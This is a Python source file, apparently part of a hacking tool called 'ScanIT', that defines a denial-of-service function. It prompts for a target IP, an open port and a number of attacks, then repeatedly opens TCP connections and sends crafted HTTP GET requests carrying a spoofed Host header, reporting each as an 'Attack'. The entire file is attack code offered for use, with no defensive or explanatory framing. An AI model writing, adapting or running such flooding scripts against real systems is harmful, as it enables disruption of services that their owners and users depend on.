#!/usr/bin/python3

#importing modules 
import socket
import Output
import pyfiglet
import time
from datetime import datetime
from os import system
from termcolor import colored
from tqdm import tqdm

    
#1. dos attack
attack_num = 0
def dos():
    system('clear')
    print("-" * 60)
    txt=colored(pyfiglet.figlet_format("ScanIT", 'banner3'), 'blue')
    for i in txt:
        print(i, end='')
        time.sleep(.001)
    print("-" * 60)
    print('\n')
    target = input("Enter Target IP (Eg:- 192.168.1.1): ")
    fake_ip = '182.21.20.32'
    port = int(input("Enter a open port (Eg:- 135): "))
    att = int(input('Enter no of Attacks (Eg: - 100): '))

    def attack():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            global attack_num
            attack_num += 1
            print('Attack', attack_num)
            s.close()
        except:
            error = colored('\nError (check IP address or Port Number) \n\n','red')
            print(error)
            dos()
    Output.newline()
    Output.dosdata(target, att)
    for i in range(att):
        attack()
    for i in tqdm(range(10), 'Attacking Successfully completed', colour='green'):
        time.sleep(.1)
